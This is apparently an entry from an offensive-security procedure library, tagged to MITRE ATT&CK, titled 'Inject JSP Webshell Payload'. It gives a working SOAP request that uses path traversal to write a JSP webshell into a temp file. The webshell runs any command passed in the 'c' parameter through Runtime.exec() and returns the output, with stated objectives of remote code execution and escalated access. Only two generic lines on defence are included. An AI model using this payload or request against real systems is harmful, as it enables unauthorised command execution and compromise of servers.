---
tags:
  - payload-injection
  - webshell
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/post-soap-inject-payload]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 75e78ce3-a9c1-4a51-baf9-e4625f54605a
created_at: '2025-12-13T09:00:33.629Z'
updated_at: '2025-12-13T09:00:33.629Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Inject JSP Webshell Payload

## Summary

This procedure injects a JSP webshell payload into the copied XML file using CDATA and SOAP requests.

## Description

A SOAP main API call adds the webshell code to the XML in temp, enabling command execution via Runtime.getRuntime().exec().

## Requirements

1. File copied to temp from prior step
2. Access to deployed service
3. Crafted payload in CDATA

## Defense

Defensive measures and detection strategies:

- Sanitize SOAP inputs
- Detect anomalous file modifications

## Objectives

1. Inject executable code
2. Prepare for RCE
3. Escalate access

## Instructions

### Step 1: Send Injection Request

**Context**: Add payload to XML.

**Command** ([[commands/post-soap-inject-payload]]):
```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
...
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:main ...>
<api:in0>
<item xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp</item>
<item xsi:type="xsd:string">QAusGyxGqQqyVEhqzPbu</item>
<item xsi:type="xsd:string">QAusGyxGqQqyVEhqzPbu.war</item>
<item xsi:type="xsd:string">/bin/bash</item>
<item xsi:type="xsd:string">-addToEntityReg</item>
<item xsi:type="xsd:string"><![CDATA[<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>]]></item>
</api:in0>
</api:main>
</soapenv:Body>
</soapenv:Envelope>
```

> This injects the JSP code using CDATA.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/post-soap-inject-payload]]

## Tools Used

- [[tools/curl]]

## Tags

- payload-injection
- webshell
